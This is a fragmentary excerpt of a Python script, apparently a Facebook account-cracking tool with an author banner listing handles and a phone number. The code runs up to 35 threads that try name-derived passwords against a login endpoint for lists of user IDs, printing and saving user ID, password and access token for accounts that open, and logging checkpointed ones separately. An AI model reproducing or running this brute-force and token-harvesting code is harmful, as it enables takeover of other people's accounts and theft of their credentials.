...
figlet Hamii | lolcat
"""
___banner___ = ("""d8888b. db    db .88b  d88. d8888b.  \033[1;97m[\033[1;94m+\033[1;97m] AU : Mr.Nahim
88  `8D 88    88 88'YbdP`88 88  `8D  \033[1;97m[\033[1;94m+\033[1;97m] PN : +8801863517912
88   88 88    88 88  88  88 88oodD'  \033[1;97m[\033[1;94m+\033[1;97m] GH : Nahim404
88   88 88    88 88  88  88 88~~~    \033[1;97m[\033[1;94m+\033[1;97m] FB : Chand Muhammad Khan
88  .8D 88b  d88 88  88  88 88       \033[1;97m[\033[1;94m+\033[1;97m] TN : Cyber 420 The Silent Killer's
Y8888D' ~Y8888P' YP  YP  YP 88       \033[1;97m[\033[1;94m+\033[1;97m] Admin : (Fd/Account:- Nila Akter) Ks. Shinthia
""")
loop = 0
ok = []
cp = []
...
def ___login___():
    ...
    try:
        ...
        if ___token in ['open','Open']:
            print("%s[%s?*%s]%s FaceAkun!"%(K,P,K,P))
            os.system('xdg-open https://www.facebook.com/profile.php?id=100019167307546')
            exit()
        else:
    ...
    if ___cek in ['y','Y']:
        ...
        with ThreadPoolExecutor(max_workers=35) as (___hayuk):
            try:
                ...
                exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))
            print("\n%s[%s•%s]%s Ks.Shinthia Ok Tersimpan Di Results/Ok.txt"%(H,P,H,P))
            print("%s[%s•%s]%s Ks.Shinthia Cp Tersimpan Di Results/Cp.txt\n"%(H,P,H,P))
            for ___user in ___files:
                uid, name = ___user.split('|')
                z = name.split(' ')
...
def ___api___(total, uid, pwx):
    ...
    sys.stdout.write(
        "\r\x1b[1;97m[Ks.Shinthia] %s/%s Ok:-%s - Cp:-%s "%(loop, len(total), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ...
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[Ks.Shinthia-Ok] %s|%s|%s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ...
                print("\r\x1b[1;93m[Ks.Shinthia-Cp] %s|%s|%s\x1b[1;97m"%(uid, pw,___lahir))
...
def ___opsi___():
    ...
    try:
        ...
        exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))
    print("%s[%s?%s]%s Total Ks.Shinthia :%s %s"%(B,P,B,P,H,len(___files)))
    print("\n%s[%s•%s]%s Ks.Shinthia-Ok Tersimpan Di Opsi/Ok.txt"%(H,P,H,P))
